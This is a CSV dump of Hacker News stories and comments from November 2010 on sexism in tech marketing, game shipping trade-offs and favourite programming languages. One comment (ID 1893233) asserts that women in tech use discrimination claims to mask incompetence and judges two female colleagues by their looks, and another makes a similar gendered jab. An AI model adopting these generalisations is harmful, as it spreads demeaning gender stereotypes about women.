ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
1893235,comment,1892300,1892482,0,0,nimms,,,"not at all.  and I'm a heterosexual male.<p>I think we spend too much time demonizing basic human sexuality, and not enough time accepting and understanding it.<p>removing all semi naked pictures off magazine covers will not change the fact that people find other people sexually attractive...what it will do is make people feel terrible for having natural feelings.<p>I say this as a sole male bought up in a feminist household.  It took me a long time to realise that looking at the opposite sex was not actually a thought crime.",1289462284
1893233,comment,1892300,1892459,0,0,sp4rki,,,"Others have said it more eloquently, but it's simply that some women have a bone to pick and prefer to offload the burden of actually being good at their jobs, instead acquiring this sense of entitlement and superiority.<p>There are more men 'featured' in tech because women make a small part of the tech industry in general. Last time I checked women accounted to around 7% of of important roles in the tech industry and the number of female students of computer science was something close of 16/17%.<p>I've worked with women before on two occasions. The first one was a Php developer that was just plain awful, her code sucked, her attitude sucked, and whenever you tried to get her to mend her wrongdoings, the boss would come and ask you to just leave her alone because she loves to make claims of sex based discrimination. The second one was recently and she was one of the most amazing Java developers I've ever met, far better than most men. She was as geeky as could be, could joke with the boys all day (and freaking outdrink half of the men at night!), and she believed that ""women play the sex discrimination card when they're so bad they could be replaced by a monkey"". Honestly, it's the exact same thing as the just graduated mediocre programmer (not saying all recent graduates are mediocre, I'm targeting a specific group). They complain and complain about the unfairness of X and Y, but are seldom any good anyways.<p>It's simple stuff really. Since women are such a small part of the tech community, it's exponentially more probable that more men than women will stand out. On the bright side tough, the women that do stand out, stand out immensely. Oh and the kicker for my story in the past paragraph. The bad developer was really average looking (creeping into not good looking at all territory), while the good one was a stunning blond which would melt your heart in a second. C'est la vie.",1289462004
1893232,comment,1892737,1892948,0,0,InclinedPlane,,,"0. Finding the sweet spot in balancing quality of experience and ship-date.<p>A lot of game developers are so scared of shipping late that they put out crap as soon as its even remotely stable. They spend most of their effort on the ship-cycle treadmill rather than making the ship-cycle subservient to their desire to make excellent games. The same goes for many other creative endeavors such as software, books, movies. It takes serious guts to take a look at something that is nearly ready to be put in a box and sold to customers, and that has a realistic and high chance of turning a profit, and to say ""no, it's not good enough"". Even more so when you don't have a clear plan how to ""fix"" it.<p>On the other hand, it's easy to give in to the temptations of perfectionism and put off shipping indefinitely. Valve has managed to strike a balance, actually managing to ship games people love even after significant rework and even after significant time-lags (Team Fortress 2 spent almost a decade in development).",1289461976
1893231,story,,,40,33,e27sg,"Joojoo is dead",http://e27.sg/2010/11/11/the-joojoo-is-dead-but-fusion-garage-plans-new-products/,,1289461960
1893230,comment,1893000,1893144,0,0,codefisher,,,"Mine was similar, Python Python C/Java.  Though there are half a dozen others that I am perfectly comfortable with.",1289461907
1893229,story,,,1,1,siculars,"A NOSQL evening in Palo Alto",http://www.infinitegraph.com/information/a-nosql-evening-in-palo-alto.html,,1289461901
1893227,comment,1893000,1893000,0,0,cowpewter,,,"Happiness language: Actionscript 3<p>Hack-it-out: Python<p>$$$: Sadly at the moment Javascript (ugh)<p>I realize in the current 'zomg everyone hates flash' environment my choice for happiness language might make people look at me a bit strange, but AS3 is really a nice language. As ECMA dialects go I would rather write for the AVM than the browser any day. And when I think in code, it's usually Actionscript. Three years of hard-core Flex hacking will do that.<p>Python shows some signs of edging its way in as a replacement for my brain-speak, but I sadly don't use enough in my job right now for it to take over.",1289461747
1893226,story,,,3,0,resdirector,"$1.1bn wasted on solar power",http://www.smh.com.au/environment/climate-change/11bn-wasted-on-solar-power-20101110-17nrh.html,,1289461717
1893224,comment,1892300,1893059,0,0,nimms,,,"and yet so few women respect geeks...",1289461607
1893223,comment,1892205,1893138,0,0,ethan_,,,"What would the consequences be of not getting my stuff done at a crappy job?",1289461556
1893222,comment,1891434,1891434,0,0,gcb,,,"Why every video on youtube is with 2g or 3g?<p>not a single 3gs so far",1289461556
1893221,comment,1893000,1893000,0,0,mkramlich,,,"C is the only language that there's a strong argument for it being a fundamental language to know. Because almost every other language, OS and device driver is written in it. Not everything, of course, but it's a huge percentage.<p>I really <i>like</i> some other languages other than C. But it's hard for me to make as strong of a case for any other language as a ""must know"" language.",1289461547
1893220,comment,1892300,1892640,0,0,Marticus,,,"Agreed. I'm pretty sure the message here was ""hey you can enhance things and this is usually the most common surgically-enhanced body part,"" not ""women are items and you should make sure to keep her in the kitchen lest she learn how to work a computer or something.""<p>According to sources I can find that actually seem legitimate, we have a toss-up between liposuction and <i>gasp</i> breast enhancement.",1289461425
1893219,comment,1892300,1892494,0,0,mfukar,,,"But, that'll sell like crazy, dood!",1289461417
